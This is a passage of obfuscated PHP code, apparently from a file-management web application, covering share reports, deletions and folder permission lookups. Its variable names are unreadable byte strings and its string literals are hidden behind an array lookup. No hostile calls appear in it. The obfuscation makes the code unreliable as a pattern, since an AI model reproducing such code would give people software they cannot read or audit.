"\45{$ï‚ƒ³ëÒ}\45"), $ö¢àÜËÅ[481] => 0); $€÷º•ì¼ = Model($ö¢àÜËÅ[865])->where($¶şš”˜)->field($ö¢àÜËÅ[2055])->find(); if (!$€÷º•ì¼) { return !1; } $ÀÉ¡¼„ = substr($€÷º•ì¼[$ö¢àÜËÅ[561]], strpos($€÷º•ì¼[$ö¢àÜËÅ[561]], $ï‚ƒ³ëÒ)); $¶şš”˜ = array($ö¢àÜËÅ[191] => array($ö¢àÜËÅ[7], trim($ÀÉ¡¼„, $ö¢àÜËÅ[60]))); $­¯ãâĞ’ = Model($ö¢àÜËÅ[865])->where($¶şš”˜)->field($ö¢àÜËÅ[42])->select(); $¹¹ÃÉõµ = array_to_keyvalue($­¯ãâĞ’, $ö¢àÜËÅ[12], $ö¢àÜËÅ[42]); $¹¹ÃÉõµ[] = $€÷º•ì¼[$ö¢àÜËÅ[42]]; return implode($ö¢àÜËÅ[8], $¹¹ÃÉõµ); } protected function remove($Åäİ¿·) { $Ò·ØØûè =& $_SERVER[‚ûòÉ˜ş]; if (is_array($Åäİ¿·)) { $Åäİ¿· = array($Ò·ØØûè[7], $Åäİ¿·); } $²ÖÕÈÕ‹ = array($Ò·ØØûè[641] => $Åäİ¿·); $¢¨´Ã° = $this->where($²ÖÕÈÕ‹)->delete(); if ($¢¨´Ã°) { Model($Ò·ØØûè[642])->where(array($Ò·ØØûè[641] => $Åäİ¿·))->delete(); } $„î´ïÉ = is_array($Åäİ¿·) ? $Åäİ¿·[1] : array($Åäİ¿·); for ($Í…ÆÃ± = 0; $Í…ÆÃ± < count($„î´ïÉ); $Í…ÆÃ±++) { $¾×…Éâ = $this->getInfo($„î´ïÉ[$Í…ÆÃ±]); if ($¾×…Éâ[$Ò·ØØûè[639]] == $Ò·ØØûè[98]) { Model($Ò·ØØûè[609])->eventShare($¾×…Éâ[$Ò·ØØûè[191]], $Ò·ØØûè[2042]); } if ($¾×…Éâ[$Ò·ØØûè[538]] == $Ò·ØØûè[98]) { Model($Ò·ØØûè[609])->eventShare($¾×…Éâ[$Ò·ØØûè[191]], $Ò·ØØûè[2041]); } } return $¢¨´Ã°; } protected function removeBySource($²ùÜÓœ) { $µ¥ÉòÈİ =& $_SERVER[‚ûòÉ˜ş]; $ñÜÆ‚ñ§ = array($µ¥ÉòÈİ[467] => array($µ¥ÉòÈİ[468], $²ùÜÓœ)); $¤¥£­“© = $this->field($µ¥ÉòÈİ[641])->where($ñÜÆ‚ñ§)->select(); $¤¥£­“© = array_to_keyvalue($¤¥£­“©, $µ¥ÉòÈİ[12], $µ¥ÉòÈİ[641]); if (!$¤¥£­“©) { return; } $ñÜÆ‚ñ§ = array($µ¥ÉòÈİ[2048] => array($µ¥ÉòÈİ[468], $¤¥£­“©)); $this->where($ñÜÆ‚ñ§)->delete(); Model($µ¥ÉòÈİ[642])->where($ñÜÆ‚ñ§)->delete(); } public function listAll($Æˆ”Œüô) { $¼›Ÿ›™ë =& $_SERVER[‚ûòÉ˜ş]; $“Šµ¼± = array(); if ($Æˆ”Œüô[$¼›Ÿ›™ë[1687]]) { $“Šµ¼±[$¼›Ÿ›™ë[1687]] = $Æˆ”Œüô[$¼›Ÿ›™ë[1687]]; } if ($Æˆ”Œüô[$¼›Ÿ›™ë[800]]) { $ßÏÂñŒ¢ = $Æˆ”Œüô[$¼›Ÿ›™ë[801]] ? $Æˆ”Œüô[$¼›Ÿ›™ë[801]] : strtotime(date($¼›Ÿ›™ë[2056])); $“Šµ¼±[$¼›Ÿ›™ë[225]] = array($¼›Ÿ›™ë[386], array($Æˆ”Œüô[$¼›Ÿ›™ë[800]], $ßÏÂñŒ¢)); } if ($Æˆ”Œüô[$¼›Ÿ›™ë[43]]) { $“Šµ¼±[$Æˆ”Œüô[$¼›Ÿ›™ë[43]]] = 1; } else { $“Šµ¼±[] = array($¼›Ÿ›™ë[538] => array($¼›Ÿ›™ë[1053], 0), $¼›Ÿ›™ë[639] => array($¼›Ÿ›™ë[1053], 0), $¼›Ÿ›™ë[2030] => $¼›Ÿ›™ë[1983]); } if ($Æˆ”Œüô[$¼›Ÿ›™ë[1979]]) { $“Šµ¼±[] = array($¼›Ÿ›™ë[2027] => $Æˆ”Œüô[$¼›Ÿ›™ë[1979]], $¼›Ÿ›™ë[1584] => array($¼›Ÿ›™ë[435], "\45{$Æˆ”Œüô[$¼›Ÿ›™ë[1979]]}\45"), $¼›Ÿ›™ë[2030] => $¼›Ÿ›™ë[1983]); } $¾óñ©Ü’ = $this->_makeOrder()->where($“Šµ¼±)->selectPage(20); if (empty($¾óñ©Ü’[$¼›Ÿ›™ë[422]])) { return array(); } $this->_listDataApply($¾óñ©Ü’[$¼›Ÿ›™ë[422]]); return $¾óñ©Ü’; } public function listDataApply($ó·üòâ¸) { $this->_listDataApply($ó·üòâ¸); return $ó·üòâ¸; } private function _listDataApply(&$¬êÈ–êÛ) { $ãĞˆ„Å =& $_SERVER[‚ûòÉ˜ş]; $ÆË±ñò¾ = array_to_keyvalue($¬êÈ–êÛ, $ãĞˆ„Å[12], $ãĞˆ„Å[1687]); $µÇğ†À = Model($ãĞˆ„Å[575])->userListInfo(array_unique($ÆË±ñò¾)); $×íÔôŸŠ = array_to_keyvalue($¬êÈ–êÛ, $ãĞˆ„Å[12], $ãĞˆ„Å[191]); $øŞÊ«©€ = Model($ãĞˆ„Å[865])->sourceListInfo($×íÔôŸŠ, !0); foreach ($¬êÈ–êÛ as $ó»á‹Ô› => &$¡½ü€¥’) { $˜áÙí”¡ = $¡½ü€¥’[$ãĞˆ„Å[1687]]; $¡½ü€¥’[$ãĞˆ„Å[2057]] = $µÇğ†À[$˜áÙí”¡] ? $µÇğ†À[$˜áÙí”¡] : !1; $‡ÊÇé‚¡ = $¡½ü€¥’[$ãĞˆ„Å[191]]; $¡½ü€¥’[$ãĞˆ„Å[97]] = $øŞÊ«©€[$‡ÊÇé‚¡] ? $øŞÊ«©€[$‡ÊÇé‚¡] : !1; if ($¡½ü€¥’[$ãĞˆ„Å[97]][$ãĞˆ„Å[481]] == $ãĞˆ„Å[98]) { unset($¬êÈ–êÛ[$ó»á‹Ô›]); } if ($¡½ü€¥’[$ãĞˆ„Å[97]] != $ãĞˆ„Å[222] && !$¡½ü€¥’[$ãĞˆ„Å[97]]) { unset($¬êÈ–êÛ[$ó»á‹Ô›]); } } unset($¡½ü€¥’); $¬êÈ–êÛ = array_values($¬êÈ–êÛ); } private function _makeOrder($—´§ß ú = '') { $‘Ä•×˜ =& $_SERVER[‚ûòÉ˜ş]; $œÌÚ¶²‡ = array($‘Ä•×˜[225], $‘Ä•×˜[801], $‘Ä•×˜[2044], $‘Ä•×˜[2045]); $çİáÎĞ› = array($‘Ä•×˜[499] => $‘Ä•×˜[500], $‘Ä•×˜[501] => $‘Ä•×˜[502]); $çÄ¸©ùæ = Input::get($‘Ä•×˜[506], $‘Ä•×˜[7], $‘Ä•×˜[473], $œÌÚ¶²‡); $ŞäÇ·Ë = Input::get($‘Ä•×˜[507], $‘Ä•×˜[7], $‘Ä•×˜[2058], array($‘Ä•×˜[1976], $‘Ä•×˜[501])); $ŞäÇ·Ë = $çİáÎĞ›[$ŞäÇ·Ë]; $—´§ß ú = $—´§ß ú . "{$çÄ¸©ùæ}\40{$ŞäÇ·Ë}"; return $this->order($—´§ß ú); } public function reportAdd($›Ğõ½Ğ‰) { $Æ©“øÊÁ =& $_SERVER[‚ûòÉ˜ş]; $¿Â•ã = array($Æ©“øÊÁ[641] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[641]], $Æ©“øÊÁ[1687] => USER_ID); if (Model($Æ©“øÊÁ[2054])->where($¿Â•ã)->find()) { return !1; } $šşòïÌ‹ = array($Æ©“øÊÁ[641] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[641]], $Æ©“øÊÁ[1584] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[1584]], $Æ©“øÊÁ[191] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[191]], $Æ©“øÊÁ[517] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[517]], $Æ©“øÊÁ[1687] => USER_ID, $Æ©“øÊÁ[43] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[43]], $Æ©“øÊÁ[502] => $›Ğõ½Ğ‰[$Æ©“øÊÁ[502]]); return Model($Æ©“øÊÁ[2054])->add($šşòïÌ‹); } public function reportList($Û¼–ÑÎù) { $Òáçªüü =& $_SERVER[‚ûòÉ˜ş]; $¿ˆüº¹ = array(); if ($Û¼–ÑÎù[$Òáçªüü[800]]) { $ìúÚÄÎè = $Û¼–ÑÎù[$Òáçªüü[801]] ? $Û¼–ÑÎù[$Òáçªüü[801]] : strtotime(date($Òáçªüü[2056])); $¿ˆüº¹[$Òáçªüü[225]] = array($Òáçªüü[386], array($Û¼–ÑÎù[$Òáçªüü[800]], $ìúÚÄÎè)); } if (isset($Û¼–ÑÎù[$Òáçªüü[43]]) && in_array($Û¼–ÑÎù[$Òáçªüü[43]], array($Òáçªüü[98], $Òáçªüü[486], $Òáçªüü[2059], $Òáçªüü[2060], $Òáçªüü[2061]))) { $¿ˆüº¹[$Òáçªüü[43]] = $Û¼–ÑÎù[$Òáçªüü[43]]; } if (isset($Û¼–ÑÎù[$Òáçªüü[790]]) && in_array($Û¼–ÑÎù[$Òáçªüü[790]], array($Òáçªüü[222], $Òáçªüü[98], $Òáçªüü[486], $Òáçªüü[2059]))) { $¿ˆüº¹[$Òáçªüü[790]] = $Û¼–ÑÎù[$Òáçªüü[790]]; } $öö°Êñ™ = Input::get($Òáçªüü[507], $Òáçªüü[7], $Òáçªüü[2058], array($Òáçªüü[1976], $Òáçªüü[501])); $î×º­Š = array($Òáçªüü[499] => $Òáçªüü[500], $Òáçªüü[501] => $Òáçªüü[502]); $ÅãÑ‹©Ú = $Òáçªüü[2062] . $î×º­Š[$öö°Êñ™]; $›ÑëŠ¤ë = Model($Òáçªüü[2054])->where($¿ˆüº¹)->order($ÅãÑ‹©Ú)->selectPage(20); if (empty($›ÑëŠ¤ë[$Òáçªüü[422]])) { return array(); } $Î§„ï¢Â = array_to_keyvalue_group($›ÑëŠ¤ë[$Òáçªüü[422]], $Òáçªüü[790], $Òáçªüü[641]); if (!empty($Î§„ï¢Â[0])) { $Û¼–ÑÎù = $Î§„ï¢Â[0]; $¿ˆüº¹ = array($Òáçªüü[641] => array($Òáçªüü[7], $Û¼–ÑÎù)); $ı¦€¿”¼ = $this->where($¿ˆüº¹)->field($Òáçªüü[641])->select(); $ı¦€¿”¼ = array_to_keyvalue($ı¦€¿”¼, $Òáçªüü[12], $Òáçªüü[641]); $ÕÖíÀì¤ = array_diff($Û¼–ÑÎù, $ı¦€¿”¼); if (!empty($ÕÖíÀì¤)) { foreach ($›ÑëŠ¤ë[$Òáçªüü[422]] as $áÓïáËà => $Şûúùıó) { if (in_array($Şûúùıó[$Òáçªüü[641]], $ÕÖíÀì¤)) { unset($›ÑëŠ¤ë[$Òáçªüü[422]][$áÓïáËà]); } } } } $this->_listDataApply($›ÑëŠ¤ë[$Òáçªüü[422]]); return $›ÑëŠ¤ë; } public function reportStatus($¦¾ÂÈÛÒ) { $¢›ãŞø =& $_SERVER[‚ûòÉ˜ş]; $©…Âò¦— = array($¢›ãŞø[451] => $¦¾ÂÈÛÒ[$¢›ãŞø[451]]); $œÒ§Æîà = Model($¢›ãŞø[2054])->where($©…Âò¦—)->field($¢›ãŞø[2063])->find(); if (!$œÒ§Æîà) { return !1; } $…”ıÙ” = array($¢›ãŞø[790] => $¦¾ÂÈÛÒ[$¢›ãŞø[790]]); if ($¦¾ÂÈÛÒ[$¢›ãŞø[790]] == $¢›ãŞø[2059] && $œÒ§Æîà[$¢›ãŞø[790]] == $¢›ãŞø[2059]) { $…”ıÙ”[$¢›ãŞø[790]] = 0; } $²®ïÖÂ€ = Model($¢›ãŞø[2054])->where($©…Âò¦—)->save($…”ıÙ”); if ($¦¾ÂÈÛÒ[$¢›ãŞø[790]] == $¢›ãŞø[486]) { if ($œÒ§Æîà[$¢›ãŞø[517]] != $¢›ãŞø[222] && $this->shareFileMeta($œÒ§Æîà[$¢›ãŞø[517]])) { $this->shareFileMeta($œÒ§Æîà[$¢›ãŞø[517]], 0); } $this->remove($œÒ§Æîà[$¢›ãŞø[641]]); return !0; } if ($²®ïÖÂ€ && $¦¾ÂÈÛÒ[$¢›ãŞø[790]] == $¢›ãŞø[2059]) { $ÚáĞêåÓ = $…”ıÙ”[$¢›ãŞø[790]] == $¢›ãŞø[2059] ? 1 : 0; $this->shareFileMeta($œÒ§Æîà[$¢›ãŞø[517]], $ÚáĞêåÓ); $this->removeByFile($œÒ§Æîà[$¢›ãŞø[517]]); } return $²®ïÖÂ€; } private function removeByFile($ˆÕÉ¾şÚ) { $Øæ…’ôœ =& $_SERVER[‚ûòÉ˜ş]; $ÎÏ†œÆ— = Model($Øæ…’ôœ[865])->where(array($Øæ…’ôœ[517] => $ˆÕÉ¾şÚ))->field($Øæ…’ôœ[191])->select(); $¨Ïøø = array_to_keyvalue($ÎÏ†œÆ—, $Øæ…’ôœ[12], $Øæ…’ôœ[191]); $“¡Ãâ›é = array($Øæ…’ôœ[191] => array($Øæ…’ôœ[7], $¨Ïøø), $Øæ…’ôœ[538] => 1); $ÎÏ†œÆ— = $this->where($“¡Ãâ›é)->field($Øæ…’ôœ[641])->select(); if (empty($ÎÏ†œÆ—)) { return; } $ÒÈõÆñâ = array_to_keyvalue($ÎÏ†œÆ—, $Øæ…’ôœ[12], $Øæ…’ôœ[641]); $this->remove($ÒÈõÆñâ); } private function shareFileMeta($Ë˜Êá³ã, $¨ÛæèˆÜ = null) { $’Êœˆ =& $_SERVER[‚ûòÉ˜ş]; $¢ÜİÏ¥¡ = array($’Êœˆ[517] => $Ë˜Êá³ã, $’Êœˆ[104] => $’Êœˆ[2064]); if (is_null($¨ÛæèˆÜ)) { return Model($’Êœˆ[2065])->where($¢ÜİÏ¥¡)->find(); } $¢ÜİÏ¥¡[$’Êœˆ[427]] = $¨ÛæèˆÜ; Model($’Êœˆ[2065])->add($¢ÜİÏ¥¡, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\157\x75\x72\143\x65\137\141\x75\164\150"; public function getAuth($ù†ˆîÀë) { $ÒŠ¯ı« =& $_SERVER[‚ûòÉ˜ş]; $¿É§•À„ = $this->sourceAuthSelect($ù†ˆîÀë); $ª’¯Îüé = array(); $ÑÉç¶¢Õ = array(); $ÇÉÂ•½ = 2 << 25; foreach ($¿É§•À„ as $¿©¹À×) { $“¡Ëûîğ = Model($ÒŠ¯ı«[548])->listData($¿©¹À×[$ÒŠ¯ı«[1989]]); if (!$“¡Ëûîğ) { continue; } $ª’¯Îüé[] = $¿©¹À×; $†ïŸôûî = 0; if ($¿©¹À×[$ÒŠ¯ı«[188]] == SourceModel::TYPE_GROUP) { $†ïŸôûî = $ÇÉÂ•½ * 2; } if ($¿©¹À×[$ÒŠ¯ı«[188]] == SourceModel::TYPE_USER) { $†ïŸôûî = $ÇÉÂ•½; } if ($¿©¹À×[$ÒŠ¯ı«[188]] == SourceModel::TYPE_USER && $¿©¹À×[$ÒŠ¯ı«[546]] == $ÒŠ¯ı«[222]) { $†ïŸôûî = 0; } $ÑÉç¶¢Õ[] = $“¡Ëûîğ[$ÒŠ¯ı«[463]] + $†ïŸôûî; } array_multisort($ÑÉç¶¢Õ, SORT_DESC, $ª’¯Îüé); return $ª’¯Îüé; } public function sourceAuthSelect($š£¹å¡ß) { $·“©íª =& $_SERVER[‚ûòÉ˜ş]; static $Ö¸ıÆô = array(); $İèÔ¤ = is_array($š£¹å¡ß) ? !1 : !0; if ($İèÔ¤) { $š£¹å¡ß = array($š£¹å¡ß); } $ÔèÁ»¨ = array(); foreach ($š£¹å¡ß as $ß³•í½¼) { if (isset($Ö¸ıÆô[$ß³•í½¼])) { $ÔèÁ»¨[$ß³•í½¼] = $Ö¸ıÆô[$ß³•í½¼]; } } if (count($ÔèÁ»¨) == count($š£¹å¡ß)) { return $İèÔ¤ ? $ÔèÁ»¨[$š£¹å¡ß[0]] : $ÔèÁ»¨; } $¥ß”ƒØ = $·“©íª[2066]; $Ò‚¶ şô = array($·“©íª[191] => array($·“©íª[7], $š£¹å¡ß)); $¯ª¶£Ç = $this->field($¥ß”ƒØ)->order($·“©íª[451])->where($Ò‚¶ şô)->select(); $ÄúĞ’ğ‹ = array_to_keyvalue_group($¯ª¶£Ç, $·“©íª[191]); foreach ($š£¹å¡ß as $ß³•í½¼) { $Ö¸ıÆô[$ß³•í½¼] = $ÄúĞ’ğ‹[$ß³•í½¼] ? $ÄúĞ’ğ‹[$ß³•í½¼] : array(); } if ($İèÔ¤) { return $¯ª¶£Ç; } return $ÄúĞ’ğ‹; } public function setAuth($±’Û¯ÛŞ, $ö¸‹ó˜Ö) { $àÑÑÜ†Ç =& $_SERVER[‚ûòÉ˜ş]; $Åöï“¶ = Model($àÑÑÜ†Ç[1373])->sourceInfo($±’Û¯ÛŞ); if (!$Åöï“¶) { return !1; } if ($Åöï“¶[$àÑÑÜ†Ç[188]] != SourceModel::TYPE_GROUP) { return !1; } $ó‘×•ˆÂ = 1; $•–Ñ¨×· = $Åöï“¶[$àÑÑÜ†Ç[546]]; if ($•–Ñ¨×· != $ó‘×•ˆÂ) { $—Ù‰ÏÀû = array($àÑÑÜ†Ç[1885] => $•–Ñ¨×·); $óî°½ëŸ = Model($àÑÑÜ†Ç[1975])->field($àÑÑÜ†Ç[1687])->where($—Ù‰ÏÀû)->select(); $óî°½ëŸ = array_to_keyvalue($óî°½ëŸ, $àÑÑÜ†Ç[12], $àÑÑÜ†Ç[1687]); } $ª»Éøï¸ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Œüğ‘Íµ = array(); foreach ($ö¸‹ó˜Ö as $Ô®¥®Ú) { if (!in_array($Ô®¥®Ú[$àÑÑÜ†Ç[188]], $ª»Éøï¸)) { show_json(LNG($àÑÑÜ†Ç[2067]), !1); } if ($•–Ñ¨×· != $ó‘×•ˆÂ) { if ($Ô®¥®Ú[$àÑÑÜ†Ç[188]] == SourceModel::TYPE_GROUP) { } if ($Ô®¥®Ú[$àÑÑÜ†Ç[546]] != 0 && !in_array($Ô®¥®Ú[$àÑÑÜ†Ç[546]], $óî°½ëŸ)) { } } if ($Ô®¥®Ú[$àÑÑÜ†Ç[546]] == 0) { $Ô®¥®Ú[$àÑÑÜ†Ç[188]] = SourceModel::TYPE_USER; } $Œüğ‘Íµ[] = array($àÑÑÜ†Ç[191] => $±’Û¯ÛŞ, $àÑÑÜ†Ç[188] => intval($Ô®¥®Ú[$àÑÑÜ†Ç[188]]), $àÑÑÜ†Ç[546] => intval($Ô®¥®Ú[$àÑÑÜ†Ç[546]]), $àÑÑÜ†Ç[1989] => intval($Ô®¥®Ú[$àÑÑÜ†Ç[1989]]) ? intval($Ô®¥®Ú[$àÑÑÜ†Ç[1989]]) : 0, $àÑÑÜ†Ç[2049] => intval($Ô®¥®Ú[$àÑÑÜ†Ç[2049]]) ? intval($Ô®¥®Ú[$àÑÑÜ†Ç[2049]]) : -1); } $this->where(array($àÑÑÜ†Ç[467] => $±’Û¯ÛŞ))->delete(); $this->addAll($Œüğ‘Íµ); return !0; } public function authClear($»´®«²Á) { $ºÉºüş =& $_SERVER[‚ûòÉ˜ş]; $•‡±Æ™„ = Model($ºÉºüş[1373])->sourceInfo($»´®«²Á); $Æ„‘â¿­ = array($»´®«²Á); if ($•‡±Æ™„[$ºÉºüş[461]] == $ºÉºüş[98]) { $Øé‘ŸÚ‡ = array($ºÉºüş[628] => array($ºÉºüş[588], $•‡±Æ™„[$ºÉºüş[561]] . $»´®«²Á . $ºÉºüş[589])); $Æ„‘â¿­ = Model($ºÉºüş[1373])->field($ºÉºüş[467])->where($Øé‘ŸÚ‡)->getField($ºÉºüş[191], !0); $Æ„‘â¿­[] = $»´®«²Á; } $this->where(array($ºÉºüş[467] => array($ºÉºüş[468], $Æ„‘â¿­)))->delete(); return !0; } public function getAllChildren($™‘£†ß) { $ÂöûàÍé =& $_SERVER[‚ûòÉ˜ş]; $ï¸úøõ‘ = Model($ÂöûàÍé[1373])->sourceInfo($™‘£†ß); if ($ï¸úøõ‘[$ÂöûàÍé[461]] != $ÂöûàÍé[98]) { return $this->sourceListAuth(array($™‘£†ß)); } if ($ï¸úøõ‘[$ÂöûàÍé[188]] != SourceModel::TYPE_GROUP) { return array(); } $Ã”æ ÁÃ = 1; $ò¶î°Á = array($™‘£†ß); if ($ï¸úøõ‘[$ÂöûàÍé[190]] == $ÂöûàÍé[222] && $ï¸úøõ‘[$ÂöûàÍé[546]] != $Ã”æ ÁÃ) { $ò¶î°Á = $this->groupChidldAllRootSource($ï¸úøõ‘[$ÂöûàÍé[546]]); } $İ®Ç’¿ú = $this->field($ÂöûàÍé[191])->group($ÂöûàÍé[191])->select(); $İ®Ç’¿ú = array_to_keyvalue($İ®Ç’¿ú, $ÂöûàÍé[12], $ÂöûàÍé[191]); if (!$İ®Ç’¿ú) { return array(); } $ÜŠµ½ô™ = $ÂöûàÍé[2068]; $Ú¶ş• ¥ = array($ÂöûàÍé[191] => array($ÂöûàÍé[7], $İ®Ç’¿ú), $ÂöûàÍé[481] => $ÂöûàÍé[222]); $ÑÂáÜ„Ñ = Model($ÂöûàÍé[865])->field($ÜŠµ½ô™)->where($Ú¶ş• ¥)->select(); $£Ö¢‰İı = array($™‘£†ß); foreach ($ÑÂáÜ„Ñ as $¨øÒ¸€) { foreach ($ò¶î°Á as $õ¦«âè) { $¨ëšÓúË = $ÂöûàÍé[60] . $õ¦«âè . $ÂöûàÍé[60]; $Ç‰‰Æ = $¨øÒ¸€[$ÂöûàÍé[561]] . $¨øÒ¸€[$ÂöûàÍé[191]] . $ÂöûàÍé[60]; if (strstr($Ç‰‰Æ, $¨ëšÓúË)) { $£Ö¢‰İı[] = $¨øÒ¸€[$ÂöûàÍé[191]]; break; } } } return $this->sourceListAuth($£Ö¢‰İı); } private function sourceListAuth($¸úœØ˜å) { $Í´’ïæÚ =& $_SERVER[‚ûòÉ˜ş]; $­¿Ñãğ = Model($Í´’ïæÚ[1373])->sourceListInfo($¸úœØ˜å, !0); $Æå¹«“¹ = $this->sourceAuthSelect($¸úœØ˜å); $ã–ßá‡Å = array(); $¹À£¸åœ = array(); foreach ($­¿Ñãğ as $Š—âê²«) { unset($Š—âê²«[$Í´’ïæÚ[505]]); unset($Š—âê²«[$Í´’ïæÚ[503]]); unset($Š—âê²«[$Í´’ïæÚ[463]]); unset($Š—âê²«[$Í´’ïæÚ[97]]); $÷˜à°Éê = $Æå¹«“¹[$Š—âê²«[$Í´’ïæÚ[191]]]; if (!$÷˜à°Éê) { continue; } $Š—âê²«[$Í´’ïæÚ[2069]] = $this->authTargetInfo($÷˜à°Éê); $Š—âê²«[$Í´’ïæÚ[559]] = rtrim($Š—âê²«[$Í´’ïæÚ[565]], $Í´’ïæÚ[8]) . $Í´’ïæÚ[8] . ltrim($Š—âê²«[$Í´’ïæÚ[559]], $Í´’ïæÚ[8]); $ã–ßá‡Å[] = $Š—âê²«; $¤ªôÏÕ = count(explode($Í´’ïæÚ[8], trim($Š—âê²«[$Í´’ïæÚ[559]], $Í´’ïæÚ[8]))); $¹À£¸åœ[] = $¤ªôÏÕ + ($Š—âê²«[$Í´’ïæÚ[43]] == $Í´’ïæÚ[85] ? 0 : 1000); } array_multisort($¹À£¸åœ, SORT_ASC, $ã–ßá‡Å); return $ã–ßá‡Å; } private function groupChidldAllRootSource($€é½æû) { $šşƒ’™ =& $_SERVER[‚ûòÉ˜ş]; $·°·Ñ¯ñ = Model($šşƒ’™[2070])->groupChildrenAll($€é½æû); $÷¿†íÜÚ = array($šşƒ’™[190] => 0, $šşƒ’™[546] => array($šşƒ’™[7], $·°·Ñ¯ñ), $šşƒ’™[188] => SourceModel::TYPE_GROUP); $¾”¤ÈØ = Model($šşƒ’™[865])->field($šşƒ’™[191])->where($÷¿†íÜÚ)->select(); $¾”¤ÈØ = array_to_keyvalue($¾”¤ÈØ, $šşƒ’™[12], $šşƒ’™[191]); return $¾”¤ÈØ; } private function authTargetInfo($³¬¸³å•) { $—ë Îå =& $_SERVER[‚ûòÉ˜ş]; $·»ìñ¯Õ = array(); $²İŸğ¨¾ = array(); $Øğ©¶í = 2 << 25; foreach ($³¬¸³å• as $æÍ±ğ¥Ÿ) { $»„ÔñºÓ = Model($—ë Îå[548])->listData($æÍ±ğ¥Ÿ[$—ë Îå[1989]]); if (!$»„ÔñºÓ) { continue; } if ($æÍ±ğ¥Ÿ[$—ë Îå[188]] == SourceModel::TYPE_USER) { $Ë§¢€ Â = Model($—ë Îå[554])->getInfoSimpleOuter($æÍ±ğ¥Ÿ[$—ë Îå[546]]); if ($Ë§¢€ Â[$—ë Îå[1687]] == $—ë Îå[1229]) { continue; } if ($Ë§¢€ Â[$—ë Îå[1687]] == $—ë Îå[222]) { $Ë§¢€ Â[$—ë Îå[42]] = LNG($—ë Îå[2071]); } } else { $Ë§¢€ Â = Model($—ë Îå[562])->getInfoSimple($æÍ±ğ¥Ÿ[$—ë Îå[546]]); } if (!$Ë§¢€ Â) { continue; } $Ë§¢€ Â[$—ë Îå[516]] = $»„ÔñºÓ; $·»ìñ¯Õ[] = $Ë§¢€ Â; $”‡§êÓ· = 0; if ($æÍ±ğ¥Ÿ[$—ë Îå[188]] == SourceModel::TYPE_GROUP) { $”‡§êÓ· = $Øğ©¶í * 2; } if ($æÍ±ğ¥Ÿ[$—ë Îå[188]] == SourceModel::TYPE_USER) { $”‡§êÓ· = $Øğ©¶í; } if ($æÍ±ğ¥Ÿ[$—ë Îå[188]] == SourceModel::TYPE_USER && $æÍ±ğ¥Ÿ[$—ë Îå[546]] == $—ë Îå[222]) { $”‡§êÓ· = 0; } $²İŸğ¨¾[] = $»„ÔñºÓ[$—ë Îå[463]] + $”‡§êÓ·; } array_multisort($²İŸğ¨¾, SORT_DESC, $·»ìñ¯Õ); return $·»ìñ¯Õ; } public function getAllChildrenByUser($ŸôûïŞë, $Ó–êÜÎ) { $š¶àûÌ½ =& $_SERVER[‚ûòÉ˜ş]; $Š²§…Èö = Model($š¶àûÌ½[575])->getInfo($Ó–êÜÎ); if (!$Ó–êÜÎ || !$ŸôûïŞë || !$Š²§…Èö) { return array(); } $úÓ ÄøÚ = Model($š¶àûÌ½[1373])->sourceInfo($ŸôûïŞë); $ÖÀçÏ¼Ì = array(); $ƒˆĞƒİÂ = 1; if ($úÓ ÄøÚ[$š¶àûÌ½[190]] == $š¶àûÌ½[222] && $úÓ ÄøÚ[$š¶àûÌ½[546]] != $ƒˆĞƒİÂ && $this->groupContainUser($úÓ ÄøÚ[$š¶àûÌ½[546]], $Ó–êÜÎ)) { foreach ($Š²§…Èö[$š¶àûÌ½[2072]] as $âØÏ¢õ²) { $áİ•ØÀ­ = Model($š¶àûÌ½[562])->getInfo($âØÏ¢õ²[$š¶àûÌ½[1885]]); $½À Û»Ñ = Model($š¶àûÌ½[575])->getInfoSimpleOuter($Ó–êÜÎ); $½À Û»Ñ[$š¶àûÌ½[516]] = $âØÏ¢õ²[$š¶àûÌ½[463]]; if (Model($š¶àûÌ½[548])->authCheckAction($âØÏ¢õ²[$š¶àûÌ½[463]][$š¶àûÌ½[463]], $š¶àûÌ½[1906])) { continue; } $¸‚¼á­ = array($š¶àûÌ½[42] => $š¶àûÌ½[1249] . $áİ•ØÀ­[$š¶àûÌ½[42]], $š¶àûÌ½[191] => $áİ•ØÀ­[$š¶àûÌ½[97]][$š¶àûÌ½[191]], $š¶àûÌ½[94] => KodIO::make($áİ•ØÀ­[$š¶àûÌ½[97]][$š¶àûÌ½[191]]), $š¶àûÌ½[190] => $š¶àûÌ½[222], $š¶àûÌ½[188] => $š¶àûÌ½[555], $š¶àûÌ½[43] => $š¶àûÌ½[592], $š¶àûÌ½[559] => $áİ•ØÀ­[$š¶àûÌ½[566]], $š¶àûÌ½[1885] => $áİ•ØÀ­[$š¶àûÌ½[1885]], $š¶àûÌ½[563] => $áİ•ØÀ­[$š¶àûÌ½[190]], $š¶àûÌ½[2069] => array($½À Û»Ñ)); $ÖÀçÏ¼Ì[$¸‚¼á­[$š¶àûÌ½[191]]] = $¸‚¼á­; } } $ğ²¼ääø = array(); $³ø¬â­ƒ = $this->getAllChildren($ŸôûïŞë); foreach ($³ø¬â­ƒ as $÷Õ™®·) { $†®Èäïş = !1; foreach ($÷Õ™®·[$š¶àûÌ½[2069]] as $ğªßÁ´ü) { if ($ğªßÁ´ü[$š¶àûÌ½[1687]]) { if ($ğªßÁ´ü[$š¶àûÌ½[1687]] == $Ó–êÜÎ) { $†®Èäïş = !0; break; } } if ($ğªßÁ´ü[$š¶àûÌ½[1885]]) { if ($this->groupContainUser($ğªßÁ´ü[$š¶àûÌ½[1885]], $Ó–êÜÎ)) { $†®Èäïş = !0; break; } } } if ($†®Èäïş) { $ğ²¼ääø[] = $÷Õ™®·; } $¨Öø˜ÓÇ = $÷Õ™®·[$š¶àûÌ½[191]]; if (isset($ÖÀçÏ¼Ì[$¨Öø˜ÓÇ])) { $÷Õ™®·[$š¶àûÌ½[2069]][] = $ÖÀçÏ¼Ì[$¨Öø˜ÓÇ][0]; $ÖÀçÏ¼Ì[$¨Öø˜ÓÇ] = !1; } } $ÖÀçÏ¼Ì = array_filter(array_values($ÖÀçÏ¼Ì)); $ğ²¼ääø = array_merge($ÖÀçÏ¼Ì, $ğ²¼ääø); return $ğ²¼ääø; } public function setAllChildrenByUser($°¯úÊİ’, $ñë‡Òô, $‹ú±ªº¶) { 